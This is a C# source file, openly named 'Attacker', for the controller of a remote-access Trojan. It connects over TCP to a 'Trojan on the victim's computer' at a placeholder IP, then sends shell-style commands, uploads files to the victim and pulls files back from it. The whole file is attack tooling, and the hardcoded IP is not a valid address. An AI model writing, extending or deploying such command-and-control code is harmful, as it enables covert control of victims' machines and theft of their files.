using System.Net;
using System.Net.Sockets;
using System.Text;

namespace Attacker
{
    class Attacker
    {
        private Socket socket;

        public Attacker()
        {
            // Create the socket for the connection
            socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            // Connect to the Trojan on the victim's computer
            IPEndPoint endpoint = new IPEndPoint(IPAddress.Parse("123.456.789.012"), 1234);
            socket.Connect(endpoint);
        }

        public string SendCommand(string command)
        {
            // Send the command to the Trojan
            byte[] buffer = Encoding.UTF8.GetBytes(command);
            socket.Send(buffer);

            // Receive the response from the Trojan
            buffer = new byte[1024];
            int bytesReceived = socket.Receive(buffer);
            string response = Encoding.UTF8.GetString(buffer, 0, bytesReceived);

            return response;
        }
        public void UploadFile(string filePath)
        {
            // Read the contents of the file into a byte array
            byte[] fileContents = File.ReadAllBytes(filePath);

            // Send the file size and contents to the Trojan
            byte[] fileSizeBuffer = BitConverter.GetBytes(fileContents.Length);
            socket.Send(fileSizeBuffer);
            socket.Send(fileContents);
        }
        public void DownloadFile(string filePath)
        {
            // Receive the file size from the Trojan
            byte[] fileSizeBuffer = new byte[4];
            int bytesReceived = socket.Receive(fileSizeBuffer);
            int fileSize = BitConverter.ToInt32(fileSizeBuffer, 0);

            // Receive the file contents from the Trojan
            byte[] fileContents = new byte[fileSize];
            bytesReceived = socket.Receive(fileContents);

            // Check that the entire file was received
            if (bytesReceived == fileSize)
            {
                // Write the file contents to the specified file path
                File.WriteAllBytes(filePath, fileContents);
                Console.WriteLine("File successfully downloaded.");
            }
            else
            {
                Console.WriteLine("Error: Only received parts of the file.");
            }
        }
    }

    class Program
    {
        static void Main(string[] args)
        {
            // Create the attacker
            Attacker attacker = new Attacker();

            while (true)
            {
                // Prompt the user for a command
                Console.Write("Enter a command: ");
                string command = Console.ReadLine();

                // Send the command to the Trojan and display the response
                string response = attacker.SendCommand(command);
                Console.WriteLine(response);
            }
        }
    }
}
